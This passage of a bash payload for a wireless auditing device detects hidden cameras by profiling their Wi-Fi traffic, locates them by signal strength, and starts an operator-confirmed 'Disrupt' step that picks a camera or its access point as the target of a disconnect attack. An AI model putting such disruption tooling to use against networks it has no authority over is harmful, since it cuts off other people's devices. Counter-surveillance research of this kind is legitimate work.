  awk 'function isqrt(x, r, y) { if (x <= 0) return 0; r = x; y = int((r + 1) / 2); while (y < r) { r = y; y = int((r + x / r) / 2) } return r }
       NF == 4 { n++; f += $3; b += $2; g += $4; v[n] = $4; if ($4 > mx) mx = $4 }
       END { cv = -1
         if (n >= 8) { for (i = 2; i < n; i++) { s += v[i]; k++ } m = s / k; for (i = 2; i < n; i++) ss += (v[i] - m) * (v[i] - m)
           if (m > 0) cv = int(isqrt(int(ss / (k - 1) * 100)) / m + 0.5) }
         # %.0f, not %d: BusyBox awk casts through (int) for d/i/o/u/x/X (editors/awk.c:2418), so a
         # byte accumulator past 2^31 is corrupted - wrapped on x86, saturated on a soft-float
         # mipsel target. Bare print and %.0f take the long path and are exact.
         # (No apostrophes in here: this is a single-quoted awk program and one would close it.)
         printf "%.0f %.0f %.0f %.0f %.0f %.0f\n", n, f, b, g, mx, cv }' "$1"
}

WATCH_MAC=""; WATCH_BSSID=""; WATCH_CH=0; WATCH_ROLE=""; CAP_PIDS=""; CUR=A
declare -a RUNS

# lock_target bssid secs [channel] -> 0 locked, 1 locked by channel, 2 lock failed
LOCK_TEXT=""
lock_target() {   # lock_target <bssid> <secs> [channel]; the channel defaults to the current Watch target's
  local bssid="$1" secs="$2" c1 c2 c3 want="${3:-${WATCH_CH:-0}}"
  PINEAPPLE_EXAMINE_BSSID "$bssid" "$secs" >/dev/null 2>&1; WATCH_LOCKED=1; LAST_LOCK_TS=$EPOCHSECONDS
  sleep 0.5; c1=$(cur_channel); sleep 0.5; c2=$(cur_channel); sleep 0.5; c3=$(cur_channel)
  LOCK_TEXT="$RECON_IF ch ${c3:-?}, target ch $want"
  # rc 3, not 0: we could not read the channel back, so we do not know whether the lock took.
  # Returning 0 here recorded lock=ok for a lock that was never verified, and LOCK_TEXT never
  # reached the operator. Proceeding is still right -- the alternative is refusing every response
  # on a device whose channel cannot be read -- but it must be labelled honestly in the loot.
  [ -z "$c3" ] && { LOCK_TEXT="$RECON_IF: no channel read-back, lock unverified"; return 3; }
  # A transient unreadable sample is not evidence of hopping. Measured on the bench 2026-11-09:
  # c1 came back EMPTY while c2 and c3 both read 1 and the target channel WAS 1 -- the radio was
  # parked exactly where it was asked to be -- yet the all-three-equal test below scored that
  # "still hopping (/1/1)", returned 2, and refused the whole response (loot row LOCK_FAILED on
  # 50:92:6a:ae:a8:82). cur_channel returns empty on a read it cannot parse, which is a missing
  # sample, not a different channel; compare only the samples we actually got.
  [ -z "$c1" ] && c1="$c2"
  [ -z "$c2" ] && c2="$c3"
  if [ "$c1" = "$c2" ] && [ "$c2" = "$c3" ]; then
    [ "$c3" = "$want" ] || [ "$want" = 0 ] && return 0
    PINEAPPLE_EXAMINE_CHANNEL "$want" "$secs" >/dev/null 2>&1; sleep 1; c3=$(cur_channel)
    LOCK_TEXT="locked by channel: $RECON_IF ch $c3"
    [ "$c3" = "$want" ] && return 1
    LOCK_TEXT="ch $c3 != $want, lock failed"; return 2
  fi
  LOCK_TEXT="$RECON_IF still hopping ($c1/$c2/$c3): lock failed"; return 2
}
# cur_channel: iwinfo first, then iw. iwinfo is a declared dependency but is NOT in the measured
# device inventory (CLAUDE.md "First contact" lists tcpdump/iw/hak5cmd/scp present and does not
# mention iwinfo); iw IS measured present. Without a fallback, an absent iwinfo or a non-numeric
# read-back ("Channel: unknown" on a monitor interface) makes lock_target fail OPEN and report an
# unverified lock as lock=ok -- the false-green guard this rung is built around, inert while
# reporting healthy. The iw form is the one bands_live6 already uses.
cur_channel() {
  local c
  c=$(iwinfo "$RECON_IF" info 2>/dev/null | sed -n 's/.*Channel: \([0-9]*\).*/\1/p' | head -1)
  [ -n "$c" ] && { printf '%s' "$c"; return 0; }
  iw dev "$RECON_IF" info 2>/dev/null | sed -n 's/.*channel \([0-9]*\) .*/\1/p' | head -1
}
unlock_target() { _pineap EXAMINE CANCEL >/dev/null 2>&1; PINEAPPLE_EXAMINE_RESET >/dev/null 2>&1; WATCH_LOCKED=0; LAST_LOCK_TS=$EPOCHSECONDS; }

# captures: start_caps X -> three header-only pcaps (/tmp/cs_up_X.pcap ...); stop_caps X -> TERM + wait by PID
start_caps() {
  local x="$1" p
  rm -f "/tmp/cs_up_$x.pcap" "/tmp/cs_dn_$x.pcap" "/tmp/cs_ot_$x.pcap"
  tcpdump -i "$RECON_IF" -nn -s 32 -w "/tmp/cs_up_$x.pcap" "type data and wlan addr2 $WATCH_MAC" 2>"/tmp/cs_up_$x.err" & p=$!; CAP_PIDS="$p"; child_add "$p"
  tcpdump -i "$RECON_IF" -nn -s 32 -w "/tmp/cs_dn_$x.pcap" "type data and wlan addr1 $WATCH_MAC" 2>"/tmp/cs_dn_$x.err" & p=$!; CAP_PIDS+=" $p"; child_add "$p"
  if [ "$WATCH_OTHERS" = 1 ] && [ "$WATCH_ROLE" = cli ]; then
    tcpdump -i "$RECON_IF" -nn -s 32 -w "/tmp/cs_ot_$x.pcap" "type data and wlan addr1 $WATCH_BSSID and not wlan addr2 $WATCH_MAC" 2>"/tmp/cs_ot_$x.err" & p=$!; CAP_PIDS+=" $p"; child_add "$p"
  fi
  eval "CAPS_$x=\"\$CAP_PIDS\""
  local t="${EPOCHREALTIME:-$EPOCHSECONDS.000}"; eval "CAPT0_$x=\"${t/./}\""
}
stop_caps() {
  local x="$1" p pids t0 t1
  eval "pids=\$CAPS_$x"; eval "t0=\$CAPT0_$x"
  t1="${EPOCHREALTIME:-$EPOCHSECONDS.000}"; t1=${t1/./}
  CAP_MS=$(( (${t1:0:-3} - ${t0:0:-3}) ))      # microseconds -> milliseconds
  (( CAP_MS < 1000 )) && CAP_MS=1000
  for p in $pids; do kill -TERM "$p" 2>/dev/null; done
  for p in $pids; do wait "$p" 2>/dev/null; child_del "$p"; done
}
CAP_MS=1000
drops_of() { local n; n=$(sed -n 's/^\([0-9]*\) packets* dropped by kernel.*/\1/p' "$1" 2>/dev/null | tail -1); printf '%s' "${n:-0}"; }

# window_metrics X -> WM_* for the window (fixed point x10 where noted)
window_metrics() {
  local x="$1" s
  WM_ERR=""
  if ! pcap_buckets "/tmp/cs_up_$x.pcap" >"/tmp/cs_up_$x.b" 2>/dev/null; then WM_ERR="parse error"; fi
  pcap_buckets "/tmp/cs_dn_$x.pcap" >"/tmp/cs_dn_$x.b" 2>/dev/null || WM_ERR="parse error"
  read -r WM_USEC WM_UF WM_UB WM_UG _ WM_UCV <<<"$(bucket_stats "/tmp/cs_up_$x.b")"
  read -r _ WM_DF WM_DB WM_DG _ _ <<<"$(bucket_stats "/tmp/cs_dn_$x.b")"
  WM_OF=0; if [ -f "/tmp/cs_ot_$x.pcap" ]; then pcap_buckets "/tmp/cs_ot_$x.pcap" >"/tmp/cs_ot_$x.b" 2>/dev/null; read -r _ WM_OF _ _ _ _ <<<"$(bucket_stats "/tmp/cs_ot_$x.b")"; fi
  WM_DROPS=$(( $(drops_of "/tmp/cs_up_$x.err") + $(drops_of "/tmp/cs_dn_$x.err") ))
  s=$CAP_MS; WM_SECS10=$(( s / 100 ))                                               # measured capture length, tenths of a second
  WM_UPRATE10=$(( WM_UG * 10000 / s )); WM_UPS10=$(( WM_UF * 10000 / s ))        # big uplink fr/s x10, all uplink fr/s x10
  WM_DNRATE10=$(( WM_DG * 10000 / s ))
  if (( WM_UF >= 50 )); then WM_ASYM10=$(( WM_UB * 10 / (WM_DB + 1) )); (( WM_ASYM10 > 9999 )) && WM_ASYM10=9999; else WM_ASYM10=-1; fi
  if [ "$KEEP_RAW" = 1 ] && [ "$(stat -c %s "$LOOT_DIR/raw_$RUN_ID.txt" 2>/dev/null || echo 0)" -lt 2000000 ]; then   # ~60,000 bucket lines
    { printf '# %s up %s\n' "$EPOCHSECONDS" "$WATCH_MAC"; cat "/tmp/cs_up_$x.b"; printf '# dn\n'; cat "/tmp/cs_dn_$x.b"; } >>"$LOOT_DIR/raw_$RUN_ID.txt" 2>/dev/null
  fi
  if [ "$KEEP_PCAP" = 1 ]; then mkdir -p "$LOOT_DIR/watch_$RUN_ID"; cp "/tmp/cs_up_$x.pcap" "$LOOT_DIR/watch_$RUN_ID/up_$EPOCHSECONDS.pcap" 2>/dev/null; fi
  rm -f "/tmp/cs_up_$x.pcap" "/tmp/cs_dn_$x.pcap" "/tmp/cs_ot_$x.pcap"
}

# capture_window SECS [A-key] -> runs one window with double-buffering handled by caller; waits SECS (A stops early -> rc 10)
wait_window() {
  local secs="$1" rc
  if ui_ok; then timeout "$secs" WAIT_FOR_BUTTON_PRESS A >/dev/null 2>&1; rc=$?; (( rc == 0 )) && return 10; (( rc != 124 )) && sleep "$secs"
  else sleep "$secs"; fi
  return 0
}
rate_band() { local r10="$1"; if (( r10 < 5 )); then printf '<0.5'; elif (( r10 < 20 )); then printf '0.5-2'; elif (( r10 < 80 )); then printf '2-8'; else printf '>8'; fi; }
fmt10() { printf '%d.%d' $(( $1 / 10 )) $(( $1 % 10 < 0 ? -($1 % 10) : $1 % 10 )); }

# watch_prepare mac -> sets WATCH_* and verifies the lock; 0 ok, 1 failed (message shown)
watch_prepare() {
  local mac="$1" secs="$2" rc
  WATCH_MAC="$mac"; WATCH_ROLE="${ROLE[$mac]}"; [ "$WATCH_ROLE" = "ap+cli" ] && WATCH_ROLE=ap
  if [ "$WATCH_ROLE" = cli ]; then WATCH_BSSID="${AP_OF[$mac]}"; else WATCH_BSSID="$mac"; fi
  WATCH_CH="${CH[$mac]:-0}"; [ "$WATCH_CH" = 0 ] && WATCH_CH="${CH[$WATCH_BSSID]:-0}"
  [ -n "$WATCH_BSSID" ] && [ "$WATCH_BSSID" != "-" ] || { LOG "no BSSID: cannot lock"; return 1; }
  set_state WATCH
  LOG "[$MODE] Watch ${ID_LABEL[$mac]:-?} ${mac:9}"$'\n'"Recon paused while watching"
  [[ ${RSSI_LAST[$mac]:-0} =~ ^-?[0-9]+$ ]] && (( ${RSSI_LAST[$mac]:-0} < WATCH_MIN_RSSI )) && LOG yellow "weak signal (${RSSI_LAST[$mac]} dBm): idle verdict unreliable, Locate first"
  lock_target "$WATCH_BSSID" "$secs"; rc=$?
  if (( rc == 2 )); then LOG yellow "$LOCK_TEXT"; unlock_target; set_state SCAN; return 1; fi
  (( rc == 1 )) && LOG "$LOCK_TEXT"
  (( rc == 3 )) && LOG yellow "$LOCK_TEXT"      # proceeding, but the lock was never verified
  return 0
}

# verdict_of: from per-window arrays -> V_WORD V_BEH V_GATE V_TEXT V_EVENT
declare -a W_UP W_DN W_AS W_UF W_DF W_UPS W_CV
verdict_live() {
  local n=${#W_UP[@]} i stream=0 asym=0 down=0 up2=0 small=0 big_any=0 cvsum=0 cvn=0 rate_sum=0 cv
  V_WORD=NONE; V_BEH=0; V_GATE=0; V_TEXT=""; V_EVENT=0
  for ((i = 0; i < n; i++)); do
    (( i < 2 )) && up2=$((up2 + W_UF[i]))
    (( W_UP[i] >= THR_STREAM_UP * 10 )) && stream=$((stream + 1))
    (( W_AS[i] >= 0 && W_AS[i] >= THR_ASYM10 )) && asym=$((asym + 1))
    (( W_AS[i] >= 0 && W_AS[i] <= THR_DOWN10 && W_DF[i] > 0 )) && down=$((down + 1))
    (( W_UP[i] >= 20 )) && big_any=1
    (( W_UPS[i] > 0 )) && small=1
    (( W_CV[i] >= 0 )) && { cvsum=$((cvsum + W_CV[i])); cvn=$((cvn + 1)); }
    rate_sum=$((rate_sum + W_UP[i]))
  done
  if (( n >= 2 && up2 == 0 )); then
    V_WORD=INCONCLUSIVE
    if (( W_DF[0] + W_DF[1] == 0 )); then V_TEXT="nothing heard on this channel: lock, band or sleep"; else V_TEXT="AP heard, target silent: asleep, or too far for its data frames; move closer"; fi
    return 0
  fi
  cv=-1; (( cvn > 0 )) && cv=$((cvsum / cvn))
  if (( stream >= 4 && asym >= 2 )) && { (( cv < 0 )) || (( cv <= THR_CV10 )); }; then
    V_WORD=STREAM; V_BEH=$W_STREAM_RATE; (( n > 0 && rate_sum / n >= 250 )) && V_BEH=$W_STREAM_FAST
    (( stream * WIN_SECS >= 20 )) && V_BEH=$((V_BEH + W_SUSTAIN)); V_BEH=$((V_BEH + W_ASYM)); V_GATE=$V_BEH
    V_TEXT="steady big uplink: streaming-consistent"
  elif (( down >= 2 )); then
    V_WORD=DOWN; V_BEH=$W_DOWN; V_TEXT="two-way or download: call, phone, update; not camera-like"
  elif (( asym >= 2 )); then
    V_WORD=NONE; V_BEH=$W_ASYM; V_GATE=$W_ASYM; V_TEXT="up-heavy but below streaming rate"
  elif (( big_any == 0 && small == 1 )); then
    V_WORD=IDLE; [ "$WATCH_ROLE" = ap ] && V_WORD=QUIET; V_TEXT="idle: asleep, disarmed, local-record, or not a camera; low-rate streams can read as idle; identity only"
  else
    V_WORD=NONE; V_TEXT="traffic seen, no camera pattern"
  fi
}
V_WORD=""; V_BEH=0; V_GATE=0; V_TEXT=""; V_EVENT=0

apply_verdict() {   # apply_verdict mac -> BEH monotonic max, verdict latest, rescore
  local mac="$1"
  if [ -z "${BEH[$mac]+x}" ] || (( V_BEH > ${BEH[$mac]} )); then BEH[$mac]=$V_BEH; fi
  (( V_GATE > ${BEH_GATE[$mac]:-0} )) && BEH_GATE[$mac]=$V_GATE
  (( V_EVENT )) && EVENT_FLAG[$mac]=1
  BEH_VERDICT[$mac]="$V_WORD"
  score_device "$mac"
  upsert_rows "$mac"
  log watch "$mac verdict=$V_WORD beh=$V_BEH conf=${CONF[$mac]}"
}

# watch_tsv_row mode run secs up down asym cv delta rec drops verdict
watch_tsv_row() {
  printf '%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s\n' "$EPOCHSECONDS" "$WATCH_MAC" "$WATCH_ROLE" "$WATCH_BSSID" "$WATCH_CH" "${FREQ[$WATCH_MAC]:--}" "$@" "$BATT_W0" "$BATT" "${CHG:--}" >>"$LOOT_DIR/watch_${RUN_ID}_${WATCH_MAC//:/}.tsv"
}
BATT_W0="?"; CHG="-"
watch_tsv_hdr() { local f="$LOOT_DIR/watch_${RUN_ID}_${WATCH_MAC//:/}.tsv"; [ -s "$f" ] || printf '#epoch|mac|role|bssid|ch|freq|mode|run|secs|up|down|asym|cv|delta|rec|drops|verdict|batt_start|batt_end|charging\n' >"$f"; }

# live_view mac -> up to LIVE_WINDOWS double-buffered windows; A stops after the current window
live_view() {
  local mac="$1" i secs rc tot_drops=0 upb dnb
  secs=$(( LIVE_WINDOWS * WIN_SECS + 15 ))
  watch_prepare "$mac" "$secs" || return 1
  BATT_W0="$BATT"; command -v BATTERY_CHARGING >/dev/null 2>&1 && CHG=$(timeout 3 BATTERY_CHARGING 2>/dev/null); watch_tsv_hdr
  W_UP=(); W_DN=(); W_AS=(); W_UF=(); W_DF=(); W_UPS=(); W_CV=(); CUR=A
  start_caps A
  for ((i = 1; i <= LIVE_WINDOWS; i++)); do
    [ "$RELOCK_PER_WINDOW" = 1 ] && (( i > 1 )) && PINEAPPLE_EXAMINE_BSSID "$WATCH_BSSID" $(( WIN_SECS * 2 + 5 )) >/dev/null 2>&1
    wait_window "$WIN_SECS"; rc=$?
    stop_caps "$CUR"
    if (( rc != 10 && i < LIVE_WINDOWS )); then if [ "$CUR" = A ]; then start_caps B; else start_caps A; fi; fi
    window_metrics "$CUR"
    [ -n "$WM_ERR" ] && { LOG yellow "window $i: $WM_ERR"; }
    W_UP+=("$WM_UPRATE10"); W_DN+=("$WM_DNRATE10"); W_AS+=("$WM_ASYM10"); W_UF+=("$WM_UF"); W_DF+=("$WM_DF"); W_UPS+=("$WM_UPS10"); W_CV+=("$WM_UCV")
    tot_drops=$((tot_drops + WM_DROPS))
    upb=$(( WM_UB / 1000 )); dnb=$(( WM_DB / 1000 ))
    LOG "w$i $(fmt10 "$WM_SECS10")s U ${upb}k D ${dnb}k as $( (( WM_ASYM10 >= 0 )) && fmt10 "$WM_ASYM10" || printf -- -)"$'\n'"big $(fmt10 "$WM_UPRATE10")/s oth $WM_OF$( (( WM_DROPS > 0 )) && printf ' rate capped')"
    (( rc == 10 )) && break
    [ "$CUR" = A ] && CUR=B || CUR=A
  done
  unlock_target
  verdict_live
  local cvtxt="-"; (( ${W_CV[0]:--1} >= 0 )) && cvtxt=$(fmt10 "${W_CV[0]}")
  local upsum=0 dnsum=0 assum=0 asn=0 n=${#W_UP[@]} j
  for ((j = 0; j < n; j++)); do upsum=$((upsum + W_UP[j])); dnsum=$((dnsum + W_DN[j])); (( W_AS[j] >= 0 )) && { assum=$((assum + W_AS[j])); asn=$((asn + 1)); }; done
  (( n > 0 )) && { upsum=$((upsum / n)); dnsum=$((dnsum / n)); }; (( asn > 0 )) && assum=$((assum / asn)) || assum=-1
  watch_tsv_row live 1 $((n * WIN_SECS)) "$(fmt10 "$upsum")" "$(fmt10 "$dnsum")" "$( (( assum >= 0 )) && fmt10 "$assum" || printf -- -)" "$cvtxt" - - "$tot_drops" "$V_WORD"
  if [ "$V_WORD" = INCONCLUSIVE ]; then
    set_state INCONCLUSIVE
    LOG yellow "INCONCLUSIVE (<$INCONCLUSIVE_FRAMES frames)"$'\n'"$V_TEXT"$'\n'"$LOCK_TEXT"$'\n'"recon rssi ${RSSI_LAST[$mac]:--} $( [[ ${RSSI_LAST[$mac]:-0} =~ ^-?[0-9]+$ ]] && (( ${RSSI_LAST[$mac]:-0} < -72 )) && printf '(likely too far)')"$'\n'"last seen $(( EPOCHSECONDS - ${LAST_SEEN[$mac]:-$EPOCHSECONDS} ))s ago"
    BEH_VERDICT[$mac]="INCONCLUSIVE"; log watch "$mac INCONCLUSIVE $LOCK_TEXT"
  else
    apply_verdict "$mac"
    summary_card "$mac" live "$upsum" "$dnsum" "$assum" "$cvtxt"
  fi
  BASELINE_NEXT=1; PREV_PKT=(); PREV_T=()
  return 0
}

# summary_card mac mode up10 dn10 asym10 cv -> coloured verdict + metric block + next-action picker
summary_card() {
  local mac="$1" mode="$2" up10="$3" dn10="$4" as10="$5" cv="$6" weak="" col
  [[ ${RSSI_LAST[$mac]:-0} =~ ^-?[0-9]+$ ]] && (( ${RSSI_LAST[$mac]:-0} < WATCH_MIN_RSSI )) && [ "$V_WORD" != STREAM ] && [ "$V_WORD" != EVENT ] && weak=" (weak)"
  case "$V_WORD" in STREAM|EVENT) col=red; set_state WATCH_HIT ;; EVENT?) col=yellow; set_state LANE ;; DOWN) col=cyan; set_state SCAN ;; *) col=""; set_state SCAN ;; esac
  LOG $col "$V_WORD$weak $( [ "$mode" = stim ] && printf 'best of %s' "${RUNS_N[$mac]}" ) -> ${CONF[$mac]} ${BANDNAME[$mac]}"
  LOG "up $(fmt10 "$up10")/s dn $(fmt10 "$dn10")/s as $( (( as10 >= 0 )) && fmt10 "$as10" || printf -- -) cv $cv"$'\n'"~$(rate_band "$up10") Mbps band"$'\n'"${V_TEXT}"
  # A STREAM/EVENT verdict is the strongest evidence CamHound can produce that this is a live
  # camera, so it is where the response funnel belongs: detect -> Watch -> confirmed -> Disrupt.
  if [ "$V_WORD" = STREAM ] || [ "$V_WORD" = EVENT ]; then
    if auto_respond_ok "$mac" && confirm "Streaming confirmed. Disrupt ${ID_LABEL[$mac]:-${mac:9}}?"; then
      disrupt_menu "$mac"; return 0
    fi
  fi
  if [ "$V_WORD" = STREAM ] || [ "$V_WORD" = EVENT ] || (( ${CONF[$mac]} >= 45 )); then
    if [ "$AUTO_LOCATE" = 1 ] && confirm "Locate ${ID_LABEL[$mac]:-${mac:9}}?"; then locate_target "$mac"; return 0; fi
  fi
  local -a items=(); [ "$mode" = stim ] && items+=("Repeat (${RUNS_N[$mac]}/$MAX_RUNS)")
  [ "$RESPONSE" = 1 ] && items+=("$(disrupt_row "$mac")")
  items+=("Locate" "Watch again" "Back")
  pick_list "$V_WORD ${mac:9}" "Back" "${items[@]}" || return 0
  case "$PICK" in
    "Repeat"*) stimulus_test "$mac" ;;
    "Disrupt"*) disrupt_menu "$mac" ;;
    "Locate") locate_target "$mac" ;;
    "Watch again") WATCH_AGAIN=$((WATCH_AGAIN + 1)); (( WATCH_AGAIN <= 5 )) && live_view "$mac" ;;
  esac
}
WATCH_AGAIN=0

# stimulus_test mac -> quiet gate, PROMPT, baseline/stimulus/post windows, EVENT scoring, repeats
stimulus_test() {
  local mac="$1" n secs ub us up delta10 asym_s rec10 i rc
  RUNS_N[$mac]=$(( ${RUNS_N[$mac]:-0} + 1 )); n=${RUNS_N[$mac]}
  if (( n > MAX_RUNS )); then RUNS_N[$mac]=$MAX_RUNS; LOG "max runs; move closer or try Live view"; return 0; fi
  secs=$(( WIN_BASE_S + 10 ))
  watch_prepare "$mac" $(( QUIET_SECS * 4 + 10 )) || return 1      # the gate may run four captures before the baseline lock
  BATT_W0="$BATT"; watch_tsv_hdr
  # quiet gate: wait for < 2 big uplink fr/s over 15 s (cap 60 s)
  LOG "waiting for camera to settle"
  for ((i = 0; i < 4; i++)); do
    start_caps A; sleep "$QUIET_SECS"; stop_caps A; window_metrics A
    (( WM_UPRATE10 < 20 )) && break
  done
  unlock_target
  PROMPT "Baseline ${WIN_BASE_S}s. Keep still." 2>/dev/null
  lock_target "$WATCH_BSSID" "$secs" >/dev/null; rc=$?
  (( rc == 2 )) && { LOG yellow "$LOCK_TEXT"; unlock_target; set_state SCAN; return 1; }
  (( rc == 3 )) && LOG yellow "$LOCK_TEXT"
  start_caps A; sleep "$WIN_BASE_S"; stop_caps A; window_metrics A; ub=$WM_UPRATE10; local ub_f=$WM_UF
  VIBRATE 100 2>/dev/null
  ALERT "Now move ${WIN_STIM_S}s" "walk, wave, lights" 2>/dev/null
  PINEAPPLE_EXAMINE_BSSID "$WATCH_BSSID" $(( WIN_STIM_S + WIN_POST_S + 15 )) >/dev/null 2>&1
  start_caps B; sleep "$WIN_STIM_S"; stop_caps B; window_metrics B; us=$WM_UPRATE10; asym_s=$WM_ASYM10
  LOG "settling ${WIN_POST_S}s"
  start_caps A; sleep "$WIN_POST_S"; stop_caps A; window_metrics A; up=$WM_UPRATE10
  (( WM_ASYM10 > asym_s )) && asym_s=$WM_ASYM10
  unlock_target
  local peak=$us; (( up > peak )) && peak=$up
  local base=$ub; (( base < THR_DELTA_FLOOR * 10 )) && base=$(( THR_DELTA_FLOOR * 10 ))
  delta10=$(( peak * 10 / base )); rec10=$(( up * 10 / (us > 0 ? us : 1) ))
  V_WORD=NONE; V_BEH=0; V_GATE=0; V_EVENT=0
  if (( ub_f == 0 && us == 0 && up == 0 )); then
    V_WORD=INCONCLUSIVE; V_TEXT="no frames from the target in any window: lock, band or sleep"
  elif (( delta10 >= THR_DELTA10 && peak >= THR_STIM_UP * 10 && asym_s >= THR_ASYM10 )); then
    V_WORD=EVENT; V_BEH=$W_EVENT; V_GATE=$W_EVENT; V_EVENT=1; V_TEXT="responds to motion: likely camera"
  elif (( delta10 >= THR_DELTA_WEAK10 && peak >= THR_STIM_UP * 10 && asym_s >= THR_ASYM10 )); then
    V_WORD="EVENT?"; V_BEH=$W_EVENT_WEAK; V_GATE=$W_EVENT_WEAK; V_EVENT=1; V_TEXT="uplink rose when you moved (weak)"
  else
    V_WORD=NONE; V_TEXT="no change: asleep, disarmed, in cooldown, local-record, or not a camera; identity only"
    (( delta10 < 12 && ub < 20 )) && V_WORD=IDLE
  fi
  [ "${VEND_TYPE[$mac]}" = VENDOR_ENDPOINT ] && (( V_EVENT )) && V_TEXT="responds to motion: webcam or camera; vendor ${VENDOR[$mac]}"
  RUNS+=("$n|$delta10|$peak|$asym_s|$V_WORD")
  watch_tsv_row stim "$n" $(( WIN_BASE_S + WIN_STIM_S + WIN_POST_S )) "$(fmt10 "$peak")" - "$( (( asym_s >= 0 )) && fmt10 "$asym_s" || printf -- -)" - "$(fmt10 "$delta10")" "$(fmt10 "$rec10")" "$WM_DROPS" "$V_WORD"
  if [ "$V_WORD" = INCONCLUSIVE ]; then
    set_state INCONCLUSIVE; LOG yellow "INCONCLUSIVE"$'\n'"$V_TEXT"$'\n'"$LOCK_TEXT"; BEH_VERDICT[$mac]="INCONCLUSIVE"
  else
    apply_verdict "$mac"
    LOG "base $(fmt10 "$ub") stim $(fmt10 "$us") post $(fmt10 "$up") big/s"$'\n'"delta $(fmt10 "$delta10") post x$(fmt10 "$rec10")"
    [ "$V_WORD" = NONE ] || [ "$V_WORD" = IDLE ] && LOG "cooldown hints: Blink 30-60 s, Ring ~dwell, Wyze free 5 min"
    summary_card "$mac" stim "$peak" 0 "$asym_s" -
  fi
  BASELINE_NEXT=1; PREV_PKT=(); PREV_T=()
  return 0
}

watch_menu() {
  local mac="$1"
  watchable "$mac" || { LOG "Watch n/a for ${mac:9}"; return 0; }
  WATCH_AGAIN=0; RUNS=()
  pick_list "Watch ${ID_LABEL[$mac]:-?} ${mac:9}" "Live view" "Live view" "Stimulus test (~90 s)" "Back" || return 0
  case "$PICK" in
    "Live view") live_view "$mac" ;;
    "Stimulus test"*) stimulus_test "$mac" ;;
  esac
  return 0
}

# ---- locate (MONITOR RSSI loop) ----
locate_target() {
  local mac="$1" pid tier=0 last_tier=0 med raw n size0 size1 quiet=0 silent_cap rc t0 i
  local -a ring=() lines=()
  [ -n "${ROLE[$mac]}" ] || return 0
  silent_cap=$LOCATE_SILENT_CLI; [ "${ROLE[$mac]}" != cli ] && silent_cap=$LOCATE_SILENT_AP
  rm -f /tmp/cs_signal
  _pineap MONITOR "$mac" any rate=200 timeout=600 >/tmp/cs_signal 2>&1 & pid=$!; child_add "$pid"
  WATCH_LOCKED=1; LAST_LOCK_TS=$EPOCHSECONDS
  sleep 0.5
  if ! kill -0 "$pid" 2>/dev/null; then LOG "MONITOR failed to start"; child_del "$pid"; WATCH_LOCKED=0; return 1; fi
  LOG "[$MODE] Locate ${ID_LABEL[$mac]:-?} ${mac:9}$( [ "${ROLE[$mac]}" != cli ] && printf ' (tracking AP)')"$'\n'"A = stop. Recon paused."
  log locate "start $mac"
  t0=$EPOCHSECONDS; size0=0
  while kill -0 "$pid" 2>/dev/null; do
    if ui_ok; then timeout 1 WAIT_FOR_BUTTON_PRESS A >/dev/null 2>&1; rc=$?; (( rc == 0 )) && break; (( rc != 124 )) && sleep 1; else sleep 1; fi
    size1=$(stat -c %s /tmp/cs_signal 2>/dev/null || wc -c </tmp/cs_signal)
    if (( size1 == size0 )); then
      quiet=$((quiet + 1))
      if (( quiet >= 3 )); then set_state OFF; LOG "-- stale ${quiet}s$( (( quiet >= silent_cap )) && printf ' (quiet: idle cam?)') last ${ring[-1]:--}"; fi
      continue
    fi
    size0=$size1; quiet=0
    mapfile -t lines < <(tail -n 5 /tmp/cs_signal 2>/dev/null)
    for raw in "${lines[@]}"; do
      [[ $raw =~ ^-?[0-9]+$ ]] || continue
      [ "${ring[-1]:-x}" = "$raw" ] && continue
      ring+=("$raw"); (( ${#ring[@]} > MEDIAN_N )) && ring=("${ring[@]:1}")
    done
    n=${#ring[@]}; (( n == 0 )) && continue
    # median via insertion sort copy (no fork)
    local -a s=("${ring[@]}"); local j k tmp
    for ((j = 1; j < n; j++)); do tmp=${s[j]}; k=$((j - 1)); while (( k >= 0 && s[k] > tmp )); do s[k + 1]=${s[k]}; k=$((k - 1)); done; s[k + 1]=$tmp; done
    med=${s[$((n / 2))]}
    tier=1; (( med >= -75 )) && tier=2; (( med >= -55 )) && tier=3; (( med >= -35 )) && tier=4
    # 3 dB hysteresis against the previous tier's lower edge
    if (( tier < last_tier )); then
      case "$last_tier" in 2) (( med >= -78 )) && tier=2 ;; 3) (( med >= -58 )) && tier=3 ;; 4) (( med >= -38 )) && tier=4 ;; esac
    fi
    if (( tier != last_tier )); then set_state "LOC$tier"; last_tier=$tier; fi
    case "$tier" in 1) RINGTONE "W:d=32,o=4,b=200:c" ;; 2) RINGTONE "M:d=32,o=5,b=200:c" ;; 3) RINGTONE "S:d=32,o=6,b=200:c" ;; 4) RINGTONE "H:d=32,o=7,b=200:c" ;; esac >/dev/null 2>&1 &
    i=$(( (med + 95) / 3 )); (( i < 1 )) && i=1; (( i > 20 )) && i=20
    LOG "${med}dBm [$(printf '%*s' "$i" '' | tr ' ' '#')$(printf '%*s' $((20 - i)) '' | tr ' ' '-')] raw ${ring[-1]}"
  done
  kill -TERM "$pid" 2>/dev/null; wait "$pid" 2>/dev/null; child_del "$pid"
  _pineap EXAMINE CANCEL >/dev/null 2>&1; WATCH_LOCKED=0; LAST_LOCK_TS=$EPOCHSECONDS
  log locate "stop $mac secs=$((EPOCHSECONDS - t0)) last=${ring[-1]:--}"
  set_state SCAN; BASELINE_NEXT=1; PREV_PKT=(); PREV_T=()
  return 0
}
# --- response rung begin ---
# Operator-driven disconnect. RESPONSE defaults to 1, so the rung is present; nothing transmits
# until the operator picks an attack and clears the confirm. There is no path from a detection to
# the air that does not pass through a dialog -- AUTO_RESPOND only raises the offer, never fires it.
RESP_HDR='#epoch|mac|role|bssid|target|ch|band|badge|rsn_caps|beacon_prot|attack|cmd|lock|pk_before|pk_after|verdict'
R_BSSID=""; R_TARGET=""; R_CH=0; R_BAND='?'

resp_target() {   # resp_target <mac> -> sets R_BSSID R_TARGET R_CH R_BAND; rc 1 when unattackable
  local mac="$1" ap
  R_BSSID=""; R_TARGET=""; R_CH="${CH[$mac]:-0}"; R_BAND="${BAND[$mac]:-?}"
  if [ "${ROLE[$mac]}" = cli ]; then
    ap="${AP_OF[$mac]:--}"
    [ "$ap" = - ] || [ -z "$ap" ] && return 1      # unassociated: no BSS to announce from
    R_BSSID="$ap"; R_TARGET="$mac"
    [ -n "${CH[$ap]}" ] && [ "${CH[$ap]}" != - ] && R_CH="${CH[$ap]}"   # a client rides its AP's channel
    [ -n "${BAND[$ap]}" ] && R_BAND="${BAND[$ap]}"
  else
